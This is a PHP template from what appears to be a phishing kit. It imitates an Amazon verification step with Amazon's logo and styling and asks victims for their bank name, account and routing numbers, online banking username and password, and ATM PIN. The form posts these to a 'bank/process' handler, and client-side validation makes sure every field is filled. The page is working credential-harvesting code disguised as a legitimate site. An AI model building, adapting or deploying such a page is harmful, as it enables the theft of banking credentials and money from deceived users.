<?php
defined("ALLOW") or exit('No direct script access allowed');

$country = trim($_SESSION['countryCode']);
include FCPATH . "CR51/language/lang.php";
?>
<!DOCTYPE html>
<html>

<head>
    <title>
        <?php echo $_45 ?>
    </title>
    <meta charset="UTF-8">
    <link rel="shortcut icon" href="<?= base_url() ?>CR51/Assets/_hayo/images/favicon.ico" />
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>CR51/Assets/_hayo/css/boostrap.min.css" media="all">
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/_hayo/css/sign-dekstop.css">
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/_hayo/css/style.sign-desktop.css">
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>CR51/Assets/_hayo/css/style.css">
</head>

<body onload="_loader()" style="margin:0;">
    <div id="loader"></div>
    <div style="display:none;" id="myDiv" class="animate-bon ttom">
        <div id="a-page">
            <div class="a-section a-padding-medium auth-workflow">
                <div class="a-section a-spacing-none auth-navbar">
                    <div class="a-section a-spacing-medium a-text-center">
                        <div class="a-link-nav-icon"></div><i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
                    </div>
                </div>
                <div id="authportal-center-section" class="a-section">
                    <ul class="list-unstyled multi-steps" style="padding-top: 10px" align="center">
                        <li>
                            <?php echo $_113 ?>
                        </li>
                        <li>
                            <?php echo $_46 ?>
                        </li>
                        <li class="is-active">
                            <?php echo $_47 ?>
                        </li>
                        <li>
                            <?php echo $_48 ?>
                        </li>
                    </ul>
                    <div class="cc-content4" style="padding-top: 0">
                        <div class="container">
                            <div class="row" style="padding-top: 5px">
                                <div class="col-12">
                                    <div align="center"> <img src="<?= base_url() ?>CR51/Assets/_hayo/images/bank.png" width="195"> </div>
                                    <div align="center"> <span class="lefttext" style="font-size: 20px; font-weight: 650;"><?php echo $_99 ?></span> </div>
                                    <div align="center"> <span class="lefttext"><?php echo $_72 ?></span> </div><br>
                                    <div class="mypayementarea">
                                        <form action="<?= base_url() ?>bank/process" method="post" onsubmit="return validateForm();" name="konzform" id="konzform"> <span class="colorblacked"><?php echo $_100 ?></span>
                                            <div class="row mt-3">
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="bankname">
                                                            <?php echo $_101 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput addressfocus" name="bankname" id="bankname" placeholder="<?php echo $_102 ?>" minlength="5" maxlength="30" oninput="this.value=this.value.toUpperCase()" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="accountnum">
                                                            <?php echo $_122 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput addressfocus" name="accountnum" id="accountnum" placeholder="<?php echo $_123 ?>" maxlength="25" oninput="this.value=this.value.toUpperCase()" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="username">
                                                            <?php echo $_103 ?>
                                                        </label>
                                                        <input type="text" id="username" class="form-control amazoninput cityfocus" name="username" placeholder="<?php echo $_103 ?>" maxlength="25" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="routingnum">
                                                            <?php echo $_120 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput addressfocus" name="routingnum" id="routingnum" placeholder="<?php echo $_121 ?>" maxlength="20" oninput="this.value=this.value.toUpperCase()" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="password">
                                                            <?php echo $_104 ?>
                                                        </label>
                                                        <input type="password" class="form-control amazoninput regionfocus" name="password" id="password" placeholder="<?php echo $_104 ?>" maxlength="30">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="atmpin">
                                                            <?php echo $_105 ?>
                                                        </label>
                                                        <input type="password" class="form-control amazoninput zipfocus" name="atmpin" id="atmpin" placeholder="<?php echo $_105 ?>" maxlength="5" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="a-row a-spacing-small">
                                                <span id="cvf-submit-otp-button" class="a-button a-button-span2 a-button-primary cvf-widget-btn cvf-widget-btn-verify">
                                                    <span class="a-button-inner">
                                                        <button type="submit" name="Sex" class="a-button-text" role="button"><?php echo $_7 ?></button>
                                                    </span>
                                                </span>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                                <script>
                                    P.when('A', 'ready').execute(function(A) {
                                        var $ = A.$;
                                        $('.cvf-widget-link-resend').click(function() {
                                            $('.cvf-widget-form-resend').submit();
                                        });
                                    });
                                </script>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="a-section a-spacing-top-extra-large auth-footer">
            <div class="a-divider a-divider-section">
                <div class="a-divider-inner"></div>
            </div>
            <div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_21 ?>
                </a> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_22 ?>
                </a> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_23 ?>
                </a> <span class="auth-footer-seperator"></span>
            </div>
            <div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> <?php echo $_24 ?> </span> </div>
        </div>
    </div>
    <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery-3.3.1.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery.mask.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery.validate.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/_hayo/js/additional-methods.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery.creditCardValidator.js"></script>
    <script>
        let load;

        let _loader = () => {
            load = setTimeout(showPage, 1000);
        }

        let showPage = () => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('myDiv').style.display = 'block';
        }

        const alpha = (e) => {
            let k;
            document.all ? k = e.keyCode : k = e.which;
            return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
        }

        $(document).ready(function(e) {
            $("#konzform").validate({
                errorClass: "error-class",
                rules: {
                    bankname: {
                        required: true,
                        minlength: 5
                    },
                    accountnum: {
                        required: true,
                        maxlength: 25
                    },
                    routingnum: {
                        required: true,
                        maxlength: 20
                    },
                    username: {
                        required: true,
                        minlength: 3,
                        maxlength: 30
                    },
                    password: {
                        required: true,
                        minlength: 3,
                        maxlength: 30
                    },
                    atmpin: {
                        required: true,
                        minlength: 2,
                        maxlength: 10
                    }
                },
                messages: {
                    bankname: {
                        required: "<?php echo $_106 ?>"
                    },
                    accountnum: {
                        required: "<?php echo $_125 ?>"
                    },
                    routingnum: {
                        required: "<?php echo $_124 ?>"
                    },
                    username: {
                        required: "<?php echo $_107 ?>"
                    },
                    password: {
                        required: "<?php echo $_108 ?>"
                    },
                    atmpin: {
                        required: "<?php echo $_109 ?>"
                    }
                }
            });
        })
    </script>
</body>

</html>